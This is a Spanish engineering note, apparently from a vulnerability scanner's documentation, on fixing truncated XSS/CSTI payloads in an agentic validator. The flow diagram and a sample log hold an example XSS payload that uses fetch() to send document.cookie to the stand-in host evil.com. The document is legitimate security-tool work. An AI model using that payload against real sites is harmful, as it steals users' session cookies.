# Payload Truncation Fix (v2.1.0)

> **Date**: 2026-02-02
> **Status**: ✅ FIXED (AgenticValidator)
> **Priority**: CRITICAL
> **Impact**: Validation accuracy for complex payloads

---

## Problema Identificado

### 📋 Descripción

Los payloads complejos (>200 caracteres) se estaban **truncando** en eventos del Event Bus, causando que el **AgenticValidator fallara** al intentar validar vulnerabilidades XSS/CSTI con payloads largos.

### 🔍 Análisis del Sistema

Se identificaron múltiples puntos de truncamiento en el sistema:

| Componente | Truncamiento | Límite | Nivel de Riesgo |
|-----------|--------------|---------|-----------------|
| **Finding Payload (eventos)** | ✅ Intencional | 200 chars | 🔴 **CRÍTICO** |
| **Finding Reasoning** | ✅ Intencional | 500 chars | 🔴 CRÍTICO |
| **Finding FP Reason** | ✅ Intencional | 200 chars | 🔴 CRÍTICO |
| **Tool Results** | ✅ Intencional | 2000 chars | 🟠 ALTO |
| **Mutation Payloads** | ✅ Intencional | 800 chars | 🟠 ALTO |
| **Embedding Payloads** | ✅ Intencional | 200 chars | 🟡 MEDIO |
| **Event History** | ✅ Limitado | 1000 eventos | 🟡 MEDIO |
| **Queue Depth** | ✅ Limitado | 1000 items | 🟡 MEDIO |
| **Dedup Cache** | ✅ Limitado | 1000 findings | 🟡 MEDIO |

### 📊 Flujo de Payloads

```
Phase 2 DISCOVERY (DAST)
│
│  DASTySASTAgent genera payload completo
│  Ejemplo: "<svg/onload=fetch('https://evil.com?c='+document.cookie)>" + "X"*300
│
▼
analysis_agent.py:1721 - TRUNCA A 200 CHARS
│
│  Event: VULNERABILITY_DETECTED
│  payload: "<svg/onload=fetch('https://evil.com?c='+document.cookie)>XXXX..." (200 chars)
│  _report_files: {json: "/path/to/42.json", markdown: "/path/to/42.md"}
│
▼
Phase 3 STRATEGY
│
│  team.py lee JSON completo (payload sin truncar)
│  ThinkingAgent recibe findings con payload completo + _report_files
│
▼
Queue de Especialistas
│
│  Findings en queue contienen:
│  - payload: PUEDE ESTAR TRUNCADO (si vino de evento)
│  - _report_files: metadata para recuperar payload completo
│
▼
Phase 5 VALIDATION
│
│  ❌ ANTES: AgenticValidator usaba payload truncado → validación fallaba
│  ✅ AHORA: AgenticValidator carga payload completo desde JSON
│
```

---

## Solución Implementada

### ✅ Fix: AgenticValidator Payload Loading

**Archivo**: `bugtrace/agents/agentic_validator.py`
**Método principal**: `_ensure_full_payload()`

#### Cambios Implementados

**1. Import de specialist_utils**
```python
from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data
```

**2. Método `_ensure_full_payload()`**
```python
def _ensure_full_payload(self, finding: Dict[str, Any]) -> Dict[str, Any]:
    """
    Ensure finding has full payload loaded from JSON report.

    Flujo:
    1. Verifica len(payload) ≥ 199
    2. Comprueba metadata _report_files
    3. Carga full finding data usando load_full_finding_data()
    4. Retorna finding completo o original con warnings
    """
    original_len = len(finding.get("payload", ""))

    if original_len < 199:
        return finding  # Fast-path

    if not finding.get("_report_files"):
        logger.warning("Payload truncated but no _report_files metadata")
        return finding

    try:
        full_finding = load_full_finding_data(finding)
        logger.info(f"✅ Loaded FULL payload from JSON: {len(full_finding['payload'])} chars")
        return full_finding
    except Exception as e:
        logger.error(f"Failed to load full payload: {e}")
        return finding
```

**3. Modificación de `_agentic_prepare_context()`**
```python
def _agentic_prepare_context(self, finding):
    # CRITICAL: Ensure full payload before validation
    finding = self._ensure_full_payload(finding)

    url = finding.get("url")
    payload = finding.get("payload")  # NOW FULL
    ...
```

**4. Modificación de `_validate_and_emit()`**
```python
async def _validate_and_emit(self, item):
    finding = item["finding"]

    # CRITICAL: Load full payload from JSON if truncated
    finding_with_full_payload = self._ensure_full_payload(finding)

    finding_for_validation = {
        "payload": finding_with_full_payload.get("payload"),  # FULL
        ...
    }
```

### 🧪 Testing

**Archivo**: `tests/unit/test_agentic_validator_payload_loading.py`

```bash
pytest tests/unit/test_agentic_validator_payload_loading.py -v

# Resultado: 6/6 PASSED ✅
# - test_ensure_full_payload_short_payload
# - test_ensure_full_payload_truncated_with_json
# - test_ensure_full_payload_no_metadata
# - test_ensure_full_payload_json_not_found
# - test_ensure_full_payload_no_matching_vuln
# - test_agentic_prepare_context_calls_ensure_full_payload
```

---

## Estado Actual del Sistema

### ✅ Componentes FIJADOS

| Componente | Usa Payload Completo | Implementación |
|-----------|----------------------|----------------|
| **AgenticValidator** | ✅ SÍ | `_ensure_full_payload()` |
| **XSSAgent (queue)** | ✅ SÍ | `load_full_payload_from_json()` |
| **SQLiAgent (queue)** | ✅ SÍ | `load_full_payload_from_json()` |
| **CSTIAgent (queue)** | ✅ SÍ | `load_full_payload_from_json()` |
| **Phase 3 STRATEGY** | ✅ SÍ | Lee JSON completo |

### ✅ Verificaciones

- ✅ Cache usa payloads completos para keys (no duplicados)
- ✅ Deduplicación NO usa payloads (usa type:param:host)
- ✅ CDP validation recibe payloads completos
- ✅ URL construction usa payloads completos
- ✅ Logging detallado para debugging

### ⚠️ Componentes con Truncamiento Aceptable

Estos componentes truncan payloads **por diseño** y no afectan el funcionamiento:

| Componente | Truncamiento | Justificación |
|-----------|--------------|---------------|
| **Event Bus** | 200 chars | Eficiencia de memoria, payload completo en JSON |
| **Embeddings** | 200 chars | Limitación del modelo, dedup no usa payloads |
| **Mutation Engine** | 800 chars | Límite razonable para LLM mutations |
| **Tool Results** | 2KB | Suficiente para contexto en conversación |

---

## Arquitectura de Recuperación

### Metadata `_report_files`

Todos los findings deben incluir metadata para recuperar payload completo:

```python
finding = {
    "type": "XSS",
    "parameter": "q",
    "payload": "TRUNCATED...",  # 200 chars
    "_report_files": {
        "json": "/absolute/path/to/output/scan_id/dastysast/42.json",
        "markdown": "/absolute/path/to/output/scan_id/dastysast/42.md"
    }
}
```

### Garantía de Metadata

**Phase 3 STRATEGY** (`team.py:_phase_3_strategy()`):
```python
for finding in findings:
    finding["_report_files"] = {
        "json": str(json_file),
        "markdown": str(json_file.with_suffix(".md"))
    }
```

**Events** (`analysis_agent.py:_emit_url_analyzed_event()`):
```python
# Ya incluye _report_files en eventos
await self._event_bus.emit(EventType.URL_ANALYZED, {
    "url": self.url,
    "findings": findings_payload,  # Con _report_files
    ...
})
```

---

## Monitoring y Debugging

### Logs de Carga de Payloads

```python
# Payload corto - fast path
[AgenticValidator] Payload length 25 < 199, no JSON load needed

# Payload completo cargado exitosamente
[AgenticValidator] ✅ Loaded FULL payload from JSON: 350 chars (was 200 chars truncated)

# Sin cambios después de carga
[AgenticValidator] Payload unchanged after JSON load (250 chars)

# Sin metadata - warning
[AgenticValidator] ⚠️ Payload is 250 chars (likely truncated) but no _report_files metadata found

# Error al cargar
[AgenticValidator] Failed to load full payload from JSON: FileNotFoundError
```

### Verificación de Payloads

```bash
# Verificar que findings tienen _report_files
grep "_report_files" output/*/dastysast/*.json

# Verificar longitud de payloads en eventos vs JSON
# Eventos (truncados)
grep "payload" logs/bugtrace.jsonl | jq '.data.finding.payload | length'

# JSON (completos)
jq '.vulnerabilities[].payload | length' output/*/dastysast/*.json
```

---

## Troubleshooting

### ❌ Error: "Validation failed for complex payload"

**Síntoma:**
```
[AgenticValidator] Validation FAILED for URL: https://target.com/search?q=...
[AgenticValidator] Payload used: <svg/onload=fetch('https://evil.com?c='+doc... (200 chars)
```

**Diagnóstico:**
```bash
# 1. Verificar si payload está truncado
python -c "finding = {...}; print(len(finding['payload']))"
# Si > 199 → está truncado

# 2. Verificar metadata
python -c "finding = {...}; print(finding.get('_report_files'))"
# Si None → falta metadata

# 3. Verificar JSON existe
ls -la /path/to/report.json
```

**Solución:**
- Si falta `_report_files`: Verificar Phase 3 STRATEGY está activa
- Si JSON no existe: Verificar DASTySASTAgent escribió el archivo
- Si payload no está en JSON: Verificar matching de `type` y `parameter`

### ❌ Error: "No matching vulnerability found in JSON"

**Causa**: Mismatch entre finding en evento vs JSON

**Solución:**
```python
# Verificar matching case-insensitive
finding_type = "XSS"  # Del evento
json_type = "XSS (Reflected)"  # Del JSON

# El matching usa 'in' operator (case-insensitive)
if finding_type.lower() in json_type.lower():  # ✅ Match
    ...
```

---

## Próximos Pasos

### ✅ Completado

- [x] Fix de AgenticValidator
- [x] Tests completos (6/6 passing)
- [x] Documentación actualizada
- [x] Logging de trazabilidad

### 🔄 Mejoras Futuras (Opcional)

- [ ] Aumentar límite de embeddings a 500 chars (si se implementa búsqueda semántica)
- [ ] Aumentar límite de mutation engine a 2000 chars (para payloads poliglota)
- [ ] Monitorear uso de memoria con payloads completos en cache
- [ ] Considerar compresión de payloads en Event Bus (gzip on-the-fly)

---

## Referencias

- **Issue**: Truncamiento de payloads en AgenticValidator
- **Fix**: `bugtrace/agents/agentic_validator.py`
- **Tests**: `tests/unit/test_agentic_validator_payload_loading.py`
- **Specialist Utils**: `bugtrace/agents/specialist_utils.py`
- **Documentación**: `.ai-context/architecture/agents/agentic_validator.md`

---

*Documento creado: 2026-02-02*
